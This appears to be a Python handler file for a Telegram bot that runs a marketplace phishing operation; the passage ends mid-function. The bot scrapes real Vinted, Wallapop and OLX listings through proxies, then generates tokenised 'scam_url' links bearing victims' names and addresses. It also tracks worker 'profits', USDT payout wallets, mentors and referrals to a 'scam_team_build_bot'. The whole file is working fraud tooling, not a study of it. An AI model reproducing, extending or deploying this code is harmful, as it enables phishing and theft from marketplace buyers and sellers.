from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from apps.bot.models import Bot_Message, Bot_Button, BotUser, Mentors, Profit, Referal, Country, Country_Sites, DataUserSite, Proxy
from apps.worker.models import Events
import requests
from datetime import datetime
import pandas as pd
import time
from threading import Thread
from datetime import date
from .parsing.vinted import vinted
from .parsing.wallapop import wallapop
from .parsing.olx import olx
import random
import string
import json

import subprocess
import threading
from django.utils.timezone import now, timedelta
from config import CHAT_ADMIN_ID



def is_user_active(token):
    try:
        data_user_site = DataUserSite.objects.get(token=token)
        return now() - data_user_site.last_active <= timedelta(seconds=5)
    except DataUserSite.DoesNotExist:
        return False






class Bot_Handler():
    def __init__(self) -> None:
        self.val = {}  # Инициализируем словарь для хранения переменных



    def format_message_text(self, text):
        """Форматирует текст сообщения, подставляя значения из val"""
        try:
            # Проверяем, является ли text строкой
            if not isinstance(text, str):
                return str(text)
            return text.format(val=type('DynamicValue', (), self.val))
        except KeyError as e:
            print(f"Ошибка форматирования: переменная {e} не найдена")
            return text
        except Exception as e:
            print(f"Ошибка форматирования: {e}")
            return text




    def base(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    def start(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные
        print(f'''------------- START 
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        print('мы в функции start')
        if ' ' in message['text'] and callback_data != 'start':
            if message['text'].split(' ')[1] is not None:
                user_id_main = int(message['text'].split(' ')[1].split('_')[1])
                print('user_id_main', user_id_main)
                user_id_main_obj = BotUser.objects.get(tg_id=int(user_id_main))
                if user.activate_account == False and user_id_main!=user.tg_id:
                    get, create = Referal.objects.get_or_create(
                        user_main=user_id_main_obj,
                        user_invite=user,
                    )
                    if create:
                        answer = f"@{user.username}[{user.tg_id}]"

                        user_id_main_obj.state = "referal_completed"
                        user_id_main_obj.save()

                        Events.objects.create(
                        status='ACCEPTED',
                        update_data={
                            "message": {
                                "from": {
                                    "id": int(user_id_main),  # ID пользователя в Telegram
                                    "username": user_id_main_obj.username,  # Username пользователя
                                    "first_name": user_id_main_obj.first_name,  # Имя пользователя
                                    "language_code": "ru",  # Язык пользователя
                                    "is_premium": False  # Премиум статус
                                },
                                "text": f"{answer}",  # Текст сообщения
                                "chat": {
                                    "id": int(user_id_main)  # ID чата (обычно совпадает с ID пользователя в личных сообщениях)
                                }
                            }
                        })

                    try:
                        start_message = Bot_Message.objects.get(current_state='start')
                        text = self.format_message_text(start_message.text)
                    except Bot_Message.DoesNotExist:
                        text = "Ошибка при получении состояния def start()"
                        print(text)

                    buttons = Bot_Button.objects.filter(message_trigger=start_message).order_by('id')
                    keyboard = InlineKeyboardMarkup()
                    for button in buttons:
                        keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

                    bot.send_message(user.tg_id, text, reply_markup=keyboard)
                        
        else:
            try:
                start_message = Bot_Message.objects.get(current_state='start')
                text = self.format_message_text(start_message.text)
            except Bot_Message.DoesNotExist:
                text = "Ошибка при получении состояния def start()"
                print(text)

            buttons = Bot_Button.objects.filter(message_trigger=start_message).order_by('id')
            keyboard = InlineKeyboardMarkup()
            for button in buttons:
                keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

            bot.send_message(user.tg_id, text, reply_markup=keyboard)



    # Создать ссылку
    def country(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        countrys = Country.objects.all()


        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for country in countrys:
            keyboard.add(InlineKeyboardButton(text=country.name, callback_data=f"choice_country {country.id}"))

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard)



    def choice_country(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        country_id = int(callback_data.split(' ')[1])
        country = Country.objects.get(id=country_id)
        country_sites = Country_Sites.objects.filter(name_country=country).order_by('id')
        keyboard = InlineKeyboardMarkup()
        for country_site in country_sites:
            keyboard.add(InlineKeyboardButton(text=country_site.name, callback_data=f"selected_site {country_site.id}"))

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")



    #Ввод сайта для парсинга
    def selected_site(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        country_sites_id = int(callback_data.split(' ')[1])

        def generate_random_string(length=13):
            # Указываем набор символов: цифры и заглавные буквы
            characters = string.ascii_uppercase + string.digits
            return ''.join(random.choices(characters, k=length))


        DataUserSite.objects.create(
            user=user,
            token=generate_random_string(),
            service = Country_Sites.objects.get(id=country_sites_id).name,
            scam_url = Country_Sites.objects.get(id=country_sites_id).url,
        )




        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        keyboard = InlineKeyboardMarkup()
        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    #Парсинг данных с сайта
    def parsing_site(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        user_link = message['text']
        bot.send_message(user.tg_id, "Подождите...", parse_mode="HTML")


        datausersite = DataUserSite.objects.filter(user=user).order_by('-id').first()

        proxy = Proxy.objects.order_by('?').first()

        

        url = user_link
        folder = datausersite.service
        if datausersite.service == 'Vinted':
            parser = vinted.WebsiteParser(url, proxy.username, proxy.password, proxy.proxy_host, proxy.proxy_port, folder, user.tg_id)

        if datausersite.service == 'Wallapop':
            parser = wallapop.WebsiteParser(url, folder, user.tg_id)

        if datausersite.service == 'Olx':
            parser = olx.WebsiteParser(url, folder, user.tg_id)
        product_name, price, image = parser.parse_and_save_images()

        
        datausersite.product_name = product_name
        datausersite.url = user_link
        datausersite.price = price
        datausersite.image = image
        datausersite.save()


        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = user_link

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")



    #Адрес дотсвки
    def name_parsing_site(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        fio = message['text']

        datausersite_obj = DataUserSite.objects.filter(user=user).order_by('-id').first()
        print(datausersite_obj)
        datausersite_obj.name = fio
        datausersite_obj.save()



        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")



    #Данные успешно готовы
    def address_parsing_site(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        address = message['text']

        datausersite_obj = DataUserSite.objects.filter(user=user).order_by('-id').first()
        datausersite_obj.address = address
        # datausersite_obj.token=datausersite_obj.token
        # datausersite_obj.product_name=datausersite_obj.product_name
        # datausersite_obj.price=datausersite_obj.price
        # datausersite_obj.url=datausersite_obj.url
        url_full = f"http://{datausersite_obj.scam_url}/get/{datausersite_obj.token}/"
        datausersite_obj.scam_url = url_full
        datausersite_obj.save()


        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()

        keyboard.add(InlineKeyboardButton(text=datausersite_obj.product_name, callback_data=f"full_links {datausersite_obj.id}"))

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




















 
    #Настройки
    def settings(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()


        date_today = date.today()
        date_register = user.data_register
        day_in_project = (date_today - date_register).days

        from datetime import datetime
        today_profits = Profit.objects.filter(user=user, data=datetime.now())
        total_profits = Profit.objects.filter(user=user)


        # Добавляем базовые переменные
        self.val['tg_id'] = user.tg_id
        self.val['status'] = user.status
        self.val['days_in_project'] = day_in_project
        
        self.val['today_profit_count'] = len(today_profits)
        self.val['today_profit_amount'] = sum(today_profit.price for today_profit in today_profits)

        self.val['total_profit_count'] = len(total_profits)
        self.val['total_profit_amount'] = sum(total_profit.price for total_profit in total_profits)


        self.val['mentor'] = user.has_mentor if user.has_mentor is not None else "Ты работаешь без наставника"
        self.val['payment_wallet'] = user.payment_wallet if user.payment_wallet is not None else "Настройте кошелек для выплат"

        self.val['status_wallet'] = " " if user.payment_wallet else "💸 Укажите адрес USDT кошелька 💸"
        
        
        

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        inline_buttons = [
            InlineKeyboardButton(text=button.text, callback_data=button.data)
            for button in buttons
        ]

        # Создаем клавиатуру
        keyboard = InlineKeyboardMarkup(row_width=2)


        # Первая кнопка отдельно
        keyboard.add(inline_buttons[0])
        keyboard.add(inline_buttons[1])
        
        # Средние кнопки в 2 столбца
        keyboard.add(*inline_buttons[3:-1])
        
        # # Последняя кнопка отдельно
        keyboard.add(inline_buttons[-1])


        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")






    def wallet(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['wallet'] = user.payment_wallet if user.payment_wallet else "Не указан"

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")


    def new_wallet(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state

        user.payment_wallet = message['text']
        user.save()

        # Добавляем базовые переменные
        self.val['wallet'] = user.payment_wallet if user.payment_wallet else "Не указан"

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    def calladmin(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    def cooperationcontacts(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")


    

    def technicalsupport(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for i, button in enumerate(buttons):
            if i < len(buttons) - 1:
                # Для всех кнопок кроме последней - создаем url кнопки
                keyboard.add(InlineKeyboardButton(text=button.text, url=f"https://t.me/{button.data}"))
            else:
                # Последнюю кнопку создаем как callback
                keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard)
        


    def smartsupporttoken(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['tokensmartsupp'] = user.tokensmartsupp if user.tokensmartsupp else 'Не указан'

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard)


    def smartsupporttoken_input(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        user.tokensmartsupp = message['text']
        user.save()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard)


    def mentors(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Можно перебирать кнопки + наставников и к button.data добавлять name наставника, таким образом передавать. ТАкже выводить в button text имя наставника
        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        mentors = Mentors.objects.all()
        keyboard = InlineKeyboardMarkup()
        for mentor, button in zip(mentors, buttons):
            self.val['mentor_name'] = mentor.name
            self.val['mentor_username'] = mentor.username

            button_text = self.format_message_text(button.text)
            button_data = f"{button.data.split(' ')[0]} {self.format_message_text(button.data.split(' ')[1])}"

            keyboard.add(InlineKeyboardButton(text=button_text, callback_data=button_data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard)






    def mentor_discriptions(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')


        user.state = state.current_state
        user.save()

        username = callback_data.split(' ')[1]
        mentor = Mentors.objects.get(username=username)

        self.val['username'] = username
        self.val['desciptions'] = mentor.desciptions

        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            button_text = self.format_message_text(button.data.split(' ')[1])
            button_data = f"{button.data.split(' ')[0]} {self.format_message_text(button.data.split(' ')[1])}"
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=f"{button_data}"))
            print('button_text', button_text)

        bot.send_message(user.tg_id, text, reply_markup=keyboard)



    def choose_btn(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        username = callback_data.split(' ')[1]
        self.val['username'] = username
        user.has_mentor = username
        user.save()

        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard)
    



    def allprofit(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        if Profit.objects.filter(user=user).exists():
            profits = Profit.objects.filter(user=user)
            profit_list = ""
            for i, profit in enumerate(profits, start=1):
                my_profit = f"{i})<b>{profit.price}$</b> дата: <b>{profit.data}</b>\n"
                profit_list += my_profit

            self.val['allprofit'] = profit_list
        else:
             self.val['allprofit'] = "<b>Список пуст</b>"

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    def referal_system(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        try:
            if Referal.objects.filter(user_main=user).exists():
                referals = Referal.objects.filter(user_main=user)
                for i, referal in enumerate(referals, start=1):
                    self.val['username'] = f"@{referal.user_invite.username}" if referal.user_invite.username else "@Не задан"
                    self.val['tg_id'] =  f"ID {referal.user_invite.tg_id}"
                    self.val['total_profit_count'] = f"Кол-во профитов: {referal.user_invite.total_profit_count},"
                    self.val['total_profit_amount'] = f"на сумму: {referal.user_invite.total_profit_amount} USD"
                    self.val['number'] = f"{i})"
                self.val['num_ref'] = len(referals)

            else:
                self.val['number'] = " "
                self.val['num_ref'] = 0
                self.val['username'] = " "
                self.val['tg_id'] = " "
                self.val['total_profit_count'] = " "
                self.val['total_profit_amount'] = " "
        except Exception as e:
                self.val['number'] = " "
                self.val['num_ref'] = 0
                self.val['username'] = " "
                self.val['tg_id'] = e
                self.val['total_profit_count'] = " "
                self.val['total_profit_amount'] = " "
        
        self.val['my_link'] = f"https://t.me/scam_team_build_bot?start=ref_{user.tg_id}"

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")


    def referal_completed(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['text'] = message['text']

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")


    



    

    def my_links(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        links = DataUserSite.objects.filter(user=user)

        listing = ""
        keyboard = InlineKeyboardMarkup()
        for i, link in enumerate(links, start=1):
            link_text = f"{i}. {link.token} - {link.product_name} - {link.price}$\n"
            keyboard.add(InlineKeyboardButton(text=link_text, callback_data=f"full_links {link.id}"))
            listing += link_text

        self.val['listing'] = listing
        self.val['count'] = len(links)
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))
        

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    def delete_all_links(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        DataUserSite.objects.filter(user=user).delete()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")




    
    def delete_link(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        link_id = callback_data.split(' ')[1]

        DataUserSite.objects.get(id=link_id).delete()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")







    def full_links(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        link_id = callback_data.split(' ')[1]
        print('link_id', link_id)

        link = DataUserSite.objects.get(id=int(link_id))

        self.val['service'] = link.service
        self.val['order_id'] = link.token
        self.val['name'] = link.product_name
        self.val['price'] = link.price
        self.val['url'] = link.scam_url if link.scam_url else "Ссылка не задана"

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()

        keyboard.add(InlineKeyboardButton(text="Удалить", callback_data=f"delete_link {link.id}"))
        keyboard.add(InlineKeyboardButton(text="Изменить данные", callback_data=f"change_data {link.id}"))

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")





    def change_data(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()


        link_id = callback_data.split(' ')[1]

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()


        for button in buttons:
            keyboard.row(InlineKeyboardButton(text=button.text, callback_data=f'{button.data} {link_id}'))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")







    def change_link_product_name_input(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        link_id = callback_data.split(' ')[1]
        link = DataUserSite.objects.get(id=int(link_id))

        user.token_temporary = link.token
        user.save()



        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")






    def change_link_product_name(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        
        link = DataUserSite.objects.get(token=(user.token_temporary))
        link.product_name = message['text']
        link.save()

        user.token_temporary = ' '
        user.save()


        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")







    def change_link_price_input(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        link_id = callback_data.split(' ')[1]
        link = DataUserSite.objects.get(id=int(link_id))

        user.token_temporary = link.token
        user.save()



        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")






    def change_link_price(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        
        link = DataUserSite.objects.get(token=(user.token_temporary))
        link.price = message['text']
        link.save()

        user.token_temporary = ' '
        user.save()


        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
